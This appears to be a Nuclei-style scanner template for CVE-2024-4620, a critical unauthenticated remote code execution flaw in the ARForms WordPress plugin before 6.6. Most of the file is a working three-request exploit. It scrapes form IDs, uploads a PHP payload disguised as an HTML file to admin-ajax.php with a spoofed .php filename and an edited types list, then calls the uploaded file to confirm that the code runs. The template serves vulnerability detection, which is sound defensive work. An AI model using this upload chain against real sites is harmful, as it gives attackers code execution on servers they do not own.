flow: http(1) && http(2) && http(3)
http:
- extractors:
  - attribute: id
    internal: true
    name: field_id
    type: xpath
    xpath:
    - //div[@class=" arfajax-file-upload"]
  - attribute: value
    internal: true
    name: form_id
    type: xpath
    xpath:
    - //input[@data-id="form_id"]
  raw:
  - 'GET /{{path}} HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - condition: and
    dsl:
    - contains(body, "|{{filename}}.php|")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7y508xYQXqEUtnyQ

    X-FILENAME: {{filename}}.php


    ------WebKitFormBoundary7y508xYQXqEUtnyQ

    Content-Disposition: form-data; name="action"


    arf_send_form_data

    ------WebKitFormBoundary7y508xYQXqEUtnyQ

    Content-Disposition: form-data; name="frm"


    {{form_id}}

    ------WebKitFormBoundary7y508xYQXqEUtnyQ

    Content-Disposition: form-data; name="field_id"


    {{replace(field_id,''div_'','''')}}

    ------WebKitFormBoundary7y508xYQXqEUtnyQ

    Content-Disposition: form-data; name="file_type"


    text/html

    ------WebKitFormBoundary7y508xYQXqEUtnyQ

    Content-Disposition: form-data; name="types_arr"


    htm|html, jpg|jpeg|php

    ------WebKitFormBoundary7y508xYQXqEUtnyQ

    Content-Disposition: form-data; name="is_preview"



    ------WebKitFormBoundary7y508xYQXqEUtnyQ

    Content-Disposition: form-data; name="files"; filename="tinyjpeg.html"

    Content-Type: text/html


    <?phP echo base64_decode($_GET[''input'']); ?>

    ------WebKitFormBoundary7y508xYQXqEUtnyQ--

    '
- matchers:
  - condition: and
    dsl:
    - contains((body), "{{marker}}")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /wp-content/uploads/arforms/userfiles/{{filename}}.php?input={{base64(marker)}}
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-4620
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:reputeinfosystems:arforms:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-4620
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.98701
    epss-score: 0.72422
  description: 'The ARForms - Premium WordPress Form Builder Plugin WordPress plugin
    before 6.6 allows unauthenticated users to modify uploaded files in such a way
    that PHP code can be uploaded when an upload file input is included on a form

    '
  impact: 'Unauthenticated attackers can upload malicious PHP files to achieve remote
    code execution on WordPress servers running ARForms.

    '
  metadata:
    framework: wordpress
    max-request: 3
    product: arforms
    vendor: reputeinfosystems
    verified: true
  name: ArForms < 6.6 - Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-4620
  remediation: 'Update ARForms plugin to version 6.6 or later.

    '
  severity: critical
  tags: cve,cve2024,wordpress,wp,wp-plugin,arforms,intrusive,vkev,vuln
variables:
  filename: '{{randbase(8)}}'
  marker: '{{randstr}}'
  path: '{{path}}'
